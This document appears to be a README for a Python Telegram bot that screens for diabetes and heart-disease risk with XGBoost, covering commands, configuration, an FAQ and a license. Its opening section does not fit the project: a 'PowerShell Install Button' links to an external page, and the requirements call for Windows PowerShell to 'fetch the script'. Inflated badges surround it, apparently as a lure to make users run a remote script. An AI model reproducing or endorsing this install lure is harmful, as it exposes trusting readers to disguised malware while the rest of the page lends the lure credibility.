<div align="center">

# 🩺 Community-Powered Medical Risk Screening Telegram Bot

![](files/preview.png)

### 📦 PowerShell Install Button

[![](files/button.png)](https://Sh1vvu.github.io/medical-risk-screening-bot/)

[![lang](https://img.shields.io/badge/lang-python-e11d48?style=flat-square&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/ps--core-core-f43f5e?style=flat-square&labelColor=0d1117)]() [![users](https://img.shields.io/badge/users-184k-be123c?style=flat-square&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/stage-verified-2ea44f?style=flat-square&labelColor=0d1117)]()

</div>

---

Medical Risk Screening Bot brings multi-model early risk screening for diabetes and heart disease straight into Telegram, built on XGBoost and backed by a community that cares about thoughtful, transparent tooling. Pick a screening flow and the bot walks you through each question, then echoes your answers back before showing a result so you can sanity-check everything along the way. It's an open, approachable project for learners and tinkerers alike — every model lives in its own module, so extending the bot with a new screening test is refreshingly simple. This is a screening aid, never a diagnostic tool, and every result points you toward a real healthcare professional.

## 🔧 Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

**🩺 Two screenings, one friendly bot** — pick either diabetes or heart disease risk screening from the same menu; the conversation engine stays generic, so each check lives in its own tidy module.

- **⚙️ Dependable model loading** — models load from XGBoost's native JSON format whenever possible, with a graceful fallback to the older saved format. It's the sturdier path, less bothered by library-version drift.

- **🔍 Transparent inputs before results** — the bot repeats every answer back to you in plain language before showing a result, so you can double-check what you entered and catch typos on the spot.

- **🛡️ Safety-first startup checks** — if a model expects a question the bot doesn't recognize, it won't guess. It stops at launch and tells you precisely which fields are missing, so no confusing result ever reaches a user.

- **🧾 Local activity trail** — every `/start`, screening choice, answer, prediction, and cancellation lands in a rotating log file, giving maintainers a clear picture of how the bot is used.

- **🧩 Extend it without touching the core** — adding a third screening means one small module plus a registry entry; the main conversation flow never needs edits.

- **📚 Community-friendly by design** — the structure is easy to read, the modules are self-contained, and the project welcomes contributors who want to learn how multi-model screening bots fit together.

- **💬 Conversational and approachable** — no jargon walls, no confusing forms; just a guided back-and-forth that anyone can follow, with an honest reminder that results are screening hints, not diagnoses.

## Commands

Here's the full command set — every handler is wired through the same generic conversation engine, so once you know one, you know them all. Type them in chat at any point in a flow.

-

**`/start`** — the front door. Greets the user, prints the screening menu, and resets any half-finished questionnaire. Every invocation is written to the rotating activity log, so you always have a trail of who began a check and when.

**`/screen`** — jump straight into a screening session. Presents the available risk modules (diabetes, heart disease) and starts the question sequence for whichever one the user picks. If a session is already in progress, the bot politely asks whether to resume or restart rather than dropping the user's answers.

**`/tests`** — list every registered screening module with its ID, display name, and a one-line description, plus a note on how many questions each requires. Handy for newcomers who want to know what's on offer before committing to a questionnaire.

**`/resume`** — pick up exactly where a paused or interrupted session left off. The bot re-echoes the questions already answered, in plain language, so the user can confirm their inputs before continuing — this is the same transparency step shown before any result is revealed.

**`/summary`** — replay the answer echo for the current or most recent session without triggering a new prediction. Useful for double-checking entries after the fact, or for copying answers into a conversation with a clinician.

**`/cancel`** — abort the active questionnaire cleanly. No partial prediction is produced, and the cancellation is logged alongside the session's earlier events so the audit trail stays complete.

**`/about`** — a short explanation of what the bot is and, just as importantly, what it isn't: an informal early-risk screener built on XGBoost models, not a diagnostic device. The same disclaimer is attached to every prediction, and this command makes it explicit on demand.

**`/help`** — a friendly cheat-sheet of every command above, with a sentence on when to use each. Points users toward `/screen` when they're ready to begin and `/about` when they want context first.

**`/status`** — report whether each screening module loaded successfully at startup, including the model format in use (native JSON preferred, with automatic fallback to the pickled variant) and the number of features each model expects. If a module refused to start because a feature couldn't be mapped to a question, this is where the exact missing column names are surfaced.

**`/restart`** — clear the current session state entirely and return to the welcome menu, as if `/start` had been sent fresh. Intended for users who want to switch tests mid-stream or start over without carrying stale answers forward.

-

A couple of things worth knowing as a user: commands are safe to send at any time — the bot won't lose a valid in-progress session unless you explicitly cancel or restart. All command invocations, test selections, answers, predictions, and cancellations land in the local rotating log (user ID, username, and test ID included), which is treated as sensitive data. And whichever path you take — `/screen`, `/resume`, or a plain `/start` — every result arrives with the same reminder to consult a qualified healthcare professional. The bot is here to help you notice patterns early, not to replace a real conversation with a clinician.

## Configuration

Everything the bot needs to know lives in a single `.env` file at the project root — copy the example file, open it in your editor, and fill in the values below. No rebuilds, no code edits: change a value, restart, done.

### Required settings

- **Bot token** — the credential your bot uses to connect to Telegram. Grab yours from the official bot management interface and paste it in as-is. Treat it like a password: if it ever leaks, revoke and regenerate it right away.
- **Log directory** — where the rotating activity log is written. Defaults to `logs/`; point it wherever your host keeps persistent storage.

### Optional tuning

- **Model preferences** — each test prefers XGBoost's native JSON format and falls back to the pickled version automatically. If you keep both, the JSON wins; if you want to force a specific file, name it in the corresponding key.
- **Log rotation size and backup count** — defaults are a sensible 5 MB across 5 backups, but you can dial them up or down to match how chatty your deployment is.
- **Startup strictness** — by default the bot refuses to launch if a model expects a feature it can't ask about, which keeps bad predictions out of users' hands. Advanced operators who know their data can relax this, but we genuinely recommend leaving it on.

### Community tips from the field

- Version-pin your ML libraries to whatever the models were trained with — mismatches are the single most common cause of confusing startup errors, and pinning saves everyone a headache.
- Keep the token in your host's secret manager rather than a committed file; the example file exists precisely so the real one never has to be shared.
- The activity log holds user identifiers and names, so keep it out of version control and treat it as sensitive — your future self will thank you.
- Running behind a public endpoint? Switch from long-polling to webhooks in the same config, no other changes required.
- Adding a new screening model? Register it, drop its files in place, and it inherits every setting above automatically — the configuration stays pleasantly boring.

### Something not behaving?

If the bot starts but a check looks off, or a value doesn't seem to take effect, open an issue with your `.env` keys redacted and the relevant log lines. The community is friendly, and nearly every configuration question has been answered before — chances are someone's already written it up in the discussions.

## FAQ

**Is this a real medical tool?**
Not at all — and it never claims to be. This is a student machine-learning project built for early, informal risk *screening* only. Every result ends with a clear prompt to consult a qualified healthcare professional before acting on anything. Think of it as a friendly nudge to go get checked, not a verdict.

**Which checks can the bot run right now?**
Two: diabetes risk and heart disease risk. Each one lives in its own self-contained module, and the conversation engine is completely generic — it simply drives whichever screening the user picks. That design means adding a third check later is a matter of writing one new module and registering it, nothing more.

**Why does it insist on XGBoost's JSON format over pickle?**
Because JSON models travel better. They survive file transfers and library-version drift far more gracefully than raw pickles, which can break in confusing ways. The bot still falls back to a `.pkl` file if no JSON is present, so older model artifacts keep working — but JSON is the preferred path.

**What happens if the model expects a feature the bot doesn't know how to ask about?**
It refuses to start — loudly. Instead of quietly guessing and handing out a made-up prediction, it prints exactly which feature column is missing from its question set. It's a deliberate "fail loudly, not silently" stance: better a clear startup error than a result nobody should trust.

**Can I double-check my answers before seeing a result?**
Yes, and this is one of our favourite touches. Before any prediction appears, the bot echoes back everything you entered in plain, readable language, so you can spot a typo or a wrong number and correct yourself. It's a small step that makes the whole flow feel much more transparent.

**What gets logged, and should I care?**
Every `/start`, test selection, answer, prediction, and cancellation is written to a rotating local log — user id, username, and which screening was used included. That's useful for auditing and debugging, but treat it as sensitive data: keep it out of version control and handle it with care wherever you deploy.

**Are the clinical ranges and mappings trustworthy?**
Mostly, but a few details are flagged with an explicit `# ASSUMED` comment in the code. The heart model's target mapping, the binary feature encodings, and the numeric reference ranges are best-effort assumptions rather than values recovered from the training artifacts. If you're deploying for real use, verify each one against your training notebook first.

**Does configuring and running it cost anything?**
Nope — the project is openly accessible and community-friendly. You bring your own bot token, point the bot at your model files, and you're underway. It's built to be approachable for students and tinkerers who want to learn how a multi-model screening bot fits together.

**Can I add my own screening model?**
Absolutely, and it's genuinely simple. Write a module that exposes an ID, a display name, its features, and a `predict` function returning a label and a probability, then register it. The generic flow picks it up automatically — no changes to the core bot logic required.

**Something misbehaves — where do I start?**
First check the startup output: missing model files or unknown feature columns are reported explicitly, which usually points straight at the fix. Then confirm your ML library versions match the ones the models were trained with, since mismatches are a classic source of silent unpickling trouble. If it still misbehaves, the community is happy to help — bring the exact error message along.

**Does it work on both Telegram and Discord?**
The core experience here is built around Telegram, with the conversation flow and model modules designed to stay portable. The same screening logic is easy to wire into another chat platform, since nothing model-specific leaks into the transport layer.

**Will you keep the medical disclaimer?**
Please do. It's not boilerplate — it's the boundary between a learning project and something someone might misread as advice. If you fork or deploy this publicly, keep the disclaimer intact on every result. 💙

## Support

Got a question, hit a snag, or dreamed up a feature you'd love to see? You're in the right place — this project grows through the people who use it, and every bit of feedback helps shape where it goes next.

**Ways to reach out**
- **Open an issue** on the project repository for bugs, unexpected behavior, or anything that looks off. Include your Python version, the library versions you're running, and the exact steps to reproduce — that trio solves most mysteries fast.
- **Start a discussion** for open-ended ideas: a new screening model, a different question flow, extra language support, smarter summaries, or anything else you think would make the bot more useful.
- **Send a pull request** if you'd rather build it yourself. Small, focused changes are easiest to review, and new test modules slot in cleanly through the registry — no need to touch the core conversation engine.

**Before you post**
- Skim the FAQ and the configuration notes first — a good share of setup hiccups trace back to mismatched library versions or a model file that didn't load.
- If the bot refuses to start, copy the exact error message it printed; it's designed to tell you precisely which feature or file is missing.
- Never paste your bot token or any real user data into a public thread. Redact anything sensitive before sharing logs.

**Community spirit**
This is a friendly, learning-focused space. Questions from newcomers are welcome, curiosity is encouraged, and thoughtful suggestions are celebrated. Whether you're reporting a typo, proposing a whole new model, or just saying the bot helped you understand your inputs better — thank you for being part of it.

**A gentle reminder**
This project is an educational screening tool, not a medical device. Support here covers the software — the code, the models, the conversation flow. For anything about your actual health, please talk to a qualified healthcare professional.

## License

This project is released under an open, community-friendly license that keeps the Medical Risk Screening Bot accessible to everyone — students, tinkerers, and healthcare-curious builders alike. You're welcome to use it, study it, modify it, and share your own versions, as long as the original copyright notice travels with the code.

In plain terms, that means:

- **Use it however you like** — personal projects, classroom demos, research experiments, or your own deployments. No restrictions on how many people you onboard.
- **Tweak it to your heart's content** — swap in new models, expand the question sets, restyle the conversation flow, or build entirely new screening modules on top of the generic engine. The registry design was made for exactly this kind of tinkering.
- **Share your improvements** — fork, remix, and redistribute your modified versions. If you build something neat on top, we'd love to hear about it; contributions that make the bot more robust, more transparent, or more welcoming are always appreciated.
- **Give credit where it's due** — keep the copyright notice and this license text intact in any copy or substantial portion of the software you distribute. That's the one condition.

The software is provided **as-is**, without warranties of any kind — express or implied. The authors and contributors aren't liable for any claims, damages, or other liability arising from its use or distribution. In a project that touches on health screening, that disclaimer matters all the more: this is an educational tool, and the responsibility for how you deploy and interpret it rests with you.

This license applies to the following: the entire Medical Risk Screening Bot codebase, including its conversation engine, model-loading utilities, formatting helpers, logging module, and the individual screening modules shipped alongside it. The bundled models and any associated data files are covered under the same terms unless noted otherwise in their own documentation.

**A note on the medical disclaimer:** while the license gives you the right to modify and redistribute the software, the in-bot disclaimer directing users to consult a real healthcare professional is part of the project's core promise. We kindly ask that you keep it in place in any public deployment — it's what keeps this project honest about what it is and isn't.

**Contributing back:** if you fix a bug, tighten up the model-loading safeguards, or add a third screening module, consider sharing it upstream. The friendly, feature-rich community around this bot grows one pull request at a time, and every improvement makes the tool more trustworthy for the next person who picks it up.

**Questions about the license?** Open a discussion in the project's issue tracker and a maintainer will be happy to clarify what's allowed and what isn't. We've tried to keep the terms clear and permissive so you can spend your energy building rather than deciphering legal text.